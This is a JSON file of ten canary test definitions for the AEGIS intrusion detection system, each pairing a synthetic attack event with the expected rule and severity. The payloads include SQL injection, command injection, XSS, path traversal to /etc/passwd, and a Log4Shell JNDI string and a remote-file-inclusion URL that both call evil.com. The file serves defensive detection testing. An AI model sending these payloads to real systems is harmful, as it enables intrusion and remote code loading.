{
  "_comment": "AEGIS NIDS Canary Test Definitions (Gate E) -- 10 predefined tests",
  "_comment2": "Each test sends a synthetic event and checks if the pipeline detects it.",
  "version": "1.0.0",
  "tests": [
    {
      "name": "sqli_bypass",
      "description": "SQL Injection auth bypass pattern",
      "category": "Injection",
      "expected_severity": "Critical",
      "expected_rule_id": "R0056",
      "expected_tier": "Tier-1",
      "event": {
        "attack_type": "SQLI_BYPASS",
        "src_ip": "10.0.0.5",
        "dst_port": 80,
        "payload": "' OR 1=1 --",
        "protocol": "TCP",
        "severity": "Critical",
        "policy": "Drop",
        "rule_id": "R0056"
      }
    },
    {
      "name": "cmd_injection",
      "description": "OS command injection via semicolon",
      "category": "Injection",
      "expected_severity": "Critical",
      "expected_rule_id": "R9064",
      "expected_tier": "Tier-1",
      "event": {
        "attack_type": "OSI_SEMI",
        "src_ip": "10.0.0.6",
        "dst_port": 8080,
        "payload": ";whoami",
        "protocol": "TCP",
        "severity": "Critical",
        "policy": "Drop",
        "rule_id": "R9064"
      }
    },
    {
      "name": "xss_basic",
      "description": "Basic cross-site scripting attempt",
      "category": "XSS",
      "expected_severity": "High",
      "expected_rule_id": "R9059",
      "expected_tier": "Tier-1",
      "event": {
        "attack_type": "XSS_BASIC",
        "src_ip": "10.0.0.7",
        "dst_port": 443,
        "payload": "<script>alert(1)</script>",
        "protocol": "TCP",
        "severity": "High",
        "policy": "Alert",
        "rule_id": "R9059"
      }
    },
    {
      "name": "xss_event_handler",
      "description": "XSS via event handler attribute",
      "category": "XSS",
      "expected_severity": "High",
      "expected_rule_id": "R9059",
      "expected_tier": "Tier-2",
      "event": {
        "attack_type": "XSS_EVENT",
        "src_ip": "10.0.0.8",
        "dst_port": 443,
        "payload": "<img src=x onerror=alert(1)>",
        "protocol": "TCP",
        "severity": "High",
        "policy": "Alert",
        "rule_id": "R9059"
      }
    },
    {
      "name": "path_traversal",
      "description": "Path traversal to access sensitive files",
      "category": "Path Traversal",
      "expected_severity": "Critical",
      "expected_rule_id": "R0088",
      "expected_tier": "Tier-1",
      "event": {
        "attack_type": "PATH_TRAVERSAL",
        "src_ip": "10.0.0.9",
        "dst_port": 80,
        "payload": "../../../etc/passwd",
        "protocol": "TCP",
        "severity": "Critical",
        "policy": "Block",
        "rule_id": "R0088"
      }
    },
    {
      "name": "log4j_jndi",
      "description": "Log4Shell JNDI injection",
      "category": "Exploit",
      "expected_severity": "Critical",
      "expected_rule_id": "R0056",
      "expected_tier": "Tier-1",
      "event": {
        "attack_type": "LOG4J_JNDI",
        "src_ip": "10.0.0.10",
        "dst_port": 8080,
        "payload": "${jndi:ldap://evil.com/x}",
        "protocol": "TCP",
        "severity": "Critical",
        "policy": "Drop",
        "rule_id": "R0056"
      }
    },
    {
      "name": "rfi_basic",
      "description": "Remote file inclusion attempt",
      "category": "RFI",
      "expected_severity": "High",
      "expected_rule_id": "R0088",
      "expected_tier": "Tier-1",
      "event": {
        "attack_type": "RFI_BASIC",
        "src_ip": "10.0.0.11",
        "dst_port": 80,
        "payload": "http://evil.com/shell.php",
        "protocol": "TCP",
        "severity": "High",
        "policy": "Block",
        "rule_id": "R0088"
      }
    },
    {
      "name": "port_scan",
      "description": "TCP SYN port scan pattern",
      "category": "Recon",
      "expected_severity": "Medium",
      "expected_rule_id": "R9006",
      "expected_tier": "Tier-1",
      "event": {
        "attack_type": "PORT_SCAN_SYN",
        "src_ip": "10.0.0.12",
        "dst_port": 22,
        "payload": "SYN scan",
        "protocol": "TCP",
        "severity": "Medium",
        "policy": "Alert",
        "rule_id": "R9006"
      }
    },
    {
      "name": "brute_force",
      "description": "SSH brute force authentication",
      "category": "Auth",
      "expected_severity": "Medium",
      "expected_rule_id": "R9006",
      "expected_tier": "Tier-2",
      "event": {
        "attack_type": "BRUTE_FORCE_SSH",
        "src_ip": "10.0.0.13",
        "dst_port": 22,
        "payload": "root:password123",
        "protocol": "TCP",
        "severity": "Medium",
        "policy": "Alert",
        "rule_id": "R9006"
      }
    },
    {
      "name": "data_exfil",
      "description": "Data exfiltration via DNS tunneling",
      "category": "Data Exfiltration",
      "expected_severity": "Low",
      "expected_rule_id": "R9059",
      "expected_tier": "Tier-2",
      "event": {
        "attack_type": "DATA_EXFIL_DNS",
        "src_ip": "10.0.0.14",
        "dst_port": 53,
        "payload": "large-dns-query.evil.com",
        "protocol": "UDP",
        "severity": "Low",
        "policy": "Alert",
        "rule_id": "R9059"
      }
    }
  ]
}
